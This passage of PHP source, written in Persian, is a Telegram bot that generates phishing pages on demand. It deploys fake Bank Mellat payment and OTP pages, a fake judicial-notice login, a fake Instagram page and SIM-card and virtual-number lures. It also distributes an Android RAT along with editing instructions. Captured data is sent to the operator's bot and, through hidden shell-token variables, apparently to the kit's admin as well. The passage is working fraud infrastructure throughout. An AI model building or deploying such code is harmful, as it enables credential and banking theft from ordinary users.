شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


]));
}
}
          elseif($query == "add_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/38",
                'caption'=>"نمونه درگاه ادد بزن  ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
   ##------------------------------##
        elseif($query == "eblagh"){
            file_put_contents("data/$query_id/step.txt","make_e1");
        bot('editMessageText',[ 
'chat_id'=>$query_id, 
'message_id'=>$query_messageid,
'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
    [['text'=>"نمونه",'callback_data'=>"eblagh_img"]],
    [['text'=>"<<--",'callback_data'=>"back"]]
    ]
])
]);   
}elseif(file_get_contents("data/$chat_id/step.txt")=="make_e1"){
   file_put_contents("data/$chat_id/step.txt","none");

$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
$result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){

sendmessage($chat_id,"درحال ساخت درگاه ابلاغ ...","html",$message_id);


  $vmsString = 'abcdeTUVWXYZ0123456789';
$rand = substr(str_shuffle($vmsString),0,8);

mkdir("data/$chat_id/payment/$rand");
mkdir("data/$chat_id/payment/$rand/eblagh");

copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/eblagh/captchaerror.php","data/$chat_id/payment/$rand/eblagh/captchaerror.php");
copy("source/eblagh/error.php","data/$chat_id/payment/$rand/eblagh/error.php");
copy("source/eblagh/index.php","data/$chat_id/payment/$rand/eblagh/index.php");
copy("source/eblagh/login.php","data/$chat_id/payment/$rand/eblagh/login.php");
copy("source/eblagh/send.php","data/$chat_id/payment/$rand/eblagh/send.php");
copy("source/eblagh/manifestel.json","data/$chat_id/payment/$rand/eblagh/manifest.json");

$TOKEN = '$TOKEN';
$ID = '$ID';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';


$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

$array2 = ['name'=> "ابلاغ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/eblagh",'code'=>$rand];
$encode_array2 = json_encode($array2);
$handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
fwrite($handle2, $encode_array2);

$array21 = ['name'=> "ابلاغ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/eblagh", 'code' => "$rand",'code'=>$rand];
$encode_array21 = json_encode($array21);
$handle21 = fopen("data/$chat_id/site/$text.json", 'w');
fwrite($handle21, $encode_array21);

           bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
درگاه ابلاغ شما با موفقیت ساخته شد !
➖➖➖➖➖
[🌐] توکن شما : <code>$text</code>
[📱] آیدی عددی شما : <code>$chat_id</code>
[📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/eblagh/index.php
[➡️] لینک درون رت : : https://$url/data/$chat_id/payment/$rand/eblagh/login.php
➖➖➖➖➖
🛡 Coded [ @$your_id ]
🔗 Channel [ @$your_id ]
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

     [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
     [['text'=>"<<--",'callback_data'=>"home"]],
    ]
])
]);   

  bot('sendMessage',[ 
'chat_id'=>$admin, // ID ADMIN
'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
➖➖➖➖➖
[🌐] توکن : <code>$text</code>
[📱] آیدی عددی : <code>$chat_id</code>
[📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/eblagh/index.php
➖➖➖➖➖
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

     [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

    ]
])
]);   

}
elseif($ok !== true){
   file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"eblagh"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


])));
}
  elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
  }
}
elseif($query == "eblagh_img"){
    bot('sendPhoto',[
        'chat_id'=>$query_id,
        'photo'=>"https://t.me/pishingbax_files/25",
        'caption'=>"نمونه درگاه ابلاغ ✅",
        'reply_markup'=>false,
        'message_id' =>$query_messageid
     ]);
}
##----------------------##

        elseif($query == "sighe"){
            file_put_contents("data/$query_id/step.txt","make_q1");
        bot('editMessageText',[ 
'chat_id'=>$query_id, 
'message_id'=>$query_messageid,
'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
    [['text'=>"نمونه",'callback_data'=>"sighe_img"]],
    [['text'=>"<<--",'callback_data'=>"back"]]
    ]
])
]);   
}elseif(file_get_contents("data/$chat_id/step.txt")=="make_q1"){
   file_put_contents("data/$chat_id/step.txt","none");

$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
$result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){

sendmessage($chat_id,"درحال ساخت درگاه صیغه ...","html",$message_id);


  $vmsString = 'abcdeTUVWXYZ0123456789';
$rand = substr(str_shuffle($vmsString),0,8);

mkdir("data/$chat_id/payment/$rand");
mkdir("data/$chat_id/payment/$rand/sighe");

copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/sighe/index.html","data/$chat_id/payment/$rand/sighe/index.html");
copy("source/sighe/tel.php","data/$chat_id/payment/$rand/sighe/tel.php");
copy("source/sighe/yakan.ttf","data/$chat_id/payment/$rand/sighe/yakan.ttf");

$TOKEN = '$TOKEN';
$ID = '$ID';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';


$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

$array2 = ['name'=> "صیغه" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sighe",'code'=>$rand];
$encode_array2 = json_encode($array2);
$handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
fwrite($handle2, $encode_array2);

$array21 = ['name'=> "صیغه" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sighe", 'code' => "$rand",'code'=>$rand];
$encode_array21 = json_encode($array21);
$handle21 = fopen("data/$chat_id/site/$text.json", 'w');
fwrite($handle21, $encode_array21);

           bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
درگاه صیغه شما با موفقیت ساخته شد !
➖➖➖➖➖
[🌐] توکن شما : <code>$text</code>
[📱] آیدی عددی شما : <code>$chat_id</code>
[📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/sighe/index.html
➖➖➖➖➖
🛡 Coded [ @$your_id ]
🔗 Channel [ @$your_id ]
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

     [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
     [['text'=>"<<--",'callback_data'=>"home"]],
    ]
])
]);   

  bot('sendMessage',[ 
'chat_id'=>$admin, // ID ADMIN
'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
➖➖➖➖➖
[🌐] توکن : <code>$text</code>
[📱] آیدی عددی : <code>$chat_id</code>
[📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/sighe/index.php
➖➖➖➖➖
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

     [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

    ]
])
]);   

}
elseif($ok !== true){
   file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"sighe"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


])));
}
  elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
  }
}
              elseif($query == "sighe_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/12",
                'caption'=>"نمونه درگاه صیغه یابی ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
##------------------------##
    elseif($query == "insta2"){
                    file_put_contents("data/$query_id/step.txt","vzl7kkzmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"insta2_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="vzl7kkzmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اینستاگرام ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");

copy("source/insta2/index.html","data/$chat_id/payment/$rand/index.html");
copy("source/insta2/send.php","data/$chat_id/payment/$rand/send.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اینستاگرام" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/insta2",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اینستاگرام" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/insta2", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اینستاگرام شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/index.html
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"insta2"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
                  elseif($query == "insta2_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/40",
                'caption'=>"نمونه فیک پیج  اینستا ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
##------------------------##
 elseif($query == "simple"){
        file_put_contents("data/$query_id/step.txt","make_s1s");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_s1s"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];
if($ok == true and !file_exists("data/$chat_id/rat_list/$text.json")){

  sendmessage($chat_id,"درحال ساخت رت ساده ...","html",$message_id);
$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    mkdir("data/$chat_id/rat/$rand");

copy("source/rat/index.php","data/$chat_id/rat/$rand/index.php");

      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $token_admin = '$TOKEN_SHELL';
      $id_admin = '$ID_SHELL';
   
      

    
$FileName = "data/$chat_id/rat/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$token_admin = '$TOKEN_SHELL';
$id_admin = '$ID_SHELL';
?>
");

    $array2 = ['name'=> "رت ساده (دریافت شماره تارگت)" , 'token' => $text , 'bot' => $un,'url'=>"https://$url/data/$chat_id/rat/$rand",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/rat_list/$text.json", 'w');
  fwrite($handle2, $encode_array2);
  
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    
                    رت ساده شما با موفقیت ساخته شد:)
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک شخصی شما : <code>https://$url/data/$chat_id/rat/$rand</code>
      ➖➖➖➖➖
      ❓ آموزش : فایل رت زیر را با اپک ادیتور باز کنید
	  کلمه <code>user-port</code> را سرج کنید و لینک شخصی خود را جایگزین کنید 
	  💠 ادیت درگاه درون رت :کلمه <code>gateway-url</code> را سرچ کنید و آدرس درگاه خود را قرار دهید
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
                   bot('sendMessage',[ 
    'chat_id'=>$admin, 
    'text'=>"
    
                ادمین عزیز یک نفر رت ساده ساخت
      ➖➖➖➖➖
      [🌐] توکن کاربر : <code>$text</code>
      [📱] آیدی عددی کاربر : <code>$chat_id</code>
      [📣] لینک شخصی کاربر : <code>https://$url/data/$chat_id/rat/$rand</code>
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
  
    bot('sendDocument',[
	   'chat_id'=>$chat_id,
    	'document'=>"https://t.me/pishingbax_files/47",
    	'caption'=>"رت ساده (دریافت شماره تارگت)
 ➖➖➖➖➖➖➖➖➖       
        🛑 توجه 🛑
        
        آموزش کامل ادیت رت در چنل زیر گذاشته شده👇
@Amouzesh_EditRat"
 ]);
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$mfssage_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"simple"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }   elseif(file_exists("data/$chat_id/rat_list/$text.json")){
    sendmessage($chat_id,"شما یکبار رت ساده با این توکن ساخته اید ! ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
}    
    }
##------------------------##
   elseif($query == "number"){
            file_put_contents("data/$query_id/step.txt","make_q1mm");
        bot('editMessageText',[ 
'chat_id'=>$query_id, 
'message_id'=>$query_messageid,
'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
    [['text'=>"نمونه",'callback_data'=>"number_img"]],
    [['text'=>"<<--",'callback_data'=>"back"]]
    ]
])
]);   
}elseif(file_get_contents("data/$chat_id/step.txt")=="make_q1mm"){
   file_put_contents("data/$chat_id/step.txt","none");

$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
$result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){

sendmessage($chat_id,"درحال ساخت درگاه شماره مجازی ...","html",$message_id);


  $vmsString = 'abcdeTUVWXYZ0123456789';
$rand = substr(str_shuffle($vmsString),0,8);

mkdir("data/$chat_id/payment/$rand");
mkdir("data/$chat_id/payment/$rand/number");

copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/number/index.php","data/$chat_id/payment/$rand/number/index.php");

$TOKEN = '$TOKEN';
$ID = '$ID';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';


$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

$array2 = ['name'=> "شماره مجازی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/number",'code'=>$rand];
$encode_array2 = json_encode($array2);
$handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
fwrite($handle2, $encode_array2);

$array21 = ['name'=> "شماره مجازی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/number", 'code' => "$rand",'code'=>$rand];
$encode_array21 = json_encode($array21);
$handle21 = fopen("data/$chat_id/site/$text.json", 'w');
fwrite($handle21, $encode_array21);

           bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
درگاه شماره مجازی شما با موفقیت ساخته شد !
➖➖➖➖➖
[🌐] توکن شما : <code>$text</code>
[📱] آیدی عددی شما : <code>$chat_id</code>
[📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/number/index.php
➖➖➖➖➖
🛡 Coded [ @$your_id ]
🔗 Channel [ @$your_id ]
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

     [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
     [['text'=>"<<--",'callback_data'=>"home"]],
    ]
])
]);   

  bot('sendMessage',[ 
'chat_id'=>$admin, // ID ADMIN
'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
➖➖➖➖➖
[🌐] توکن : <code>$text</code>
[📱] آیدی عددی : <code>$chat_id</code>
[📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/number/index.php
➖➖➖➖➖
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

     [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

    ]
])
]);   

}
elseif($ok !== true){
   file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"number"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


])));
}
  elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
  }
}
elseif($query == "number_img"){
    bot('sendPhoto',[
        'chat_id'=>$query_id,
        'photo'=>"https://t.me/pishingbax_files/34",
        'caption'=>"نمونه درگاه شماره مجازی ✅",
        'reply_markup'=>false,
        'message_id' =>$query_messageid
     ]);
}
##-------------------------##
    elseif($query == "sim-card"){
                    file_put_contents("data/$query_id/step.txt","l7kkzmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"sim_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="l7kkzmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه سیمکارت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/sim-card");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/sim-card/index.php","data/$chat_id/payment/$rand/sim-card/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "سیمکارت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sim-card",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "سیمکارت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sim-card", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه سیمکارت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/sim-card/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/sim-card/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"sim-card"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
              elseif($query == "sim_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/19",
                'caption'=>"نمونه درگاه سیم کارت ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
##-------------------------------------##
    elseif($query == "rubika"){
        file_put_contents("data/$query_id/step.txt","make_adasaaa1");
    bot('editMessageText',[ 
'chat_id'=>$query_id, 
'message_id'=>$query_messageid,
'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"نمونه",'callback_data'=>"rubika_img"]],
[['text'=>"<<--",'callback_data'=>"back"]]
]
])
]);   
}elseif(file_get_contents("data/$chat_id/step.txt")=="make_adasaaa1"){
file_put_contents("data/$chat_id/step.txt","none");

$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
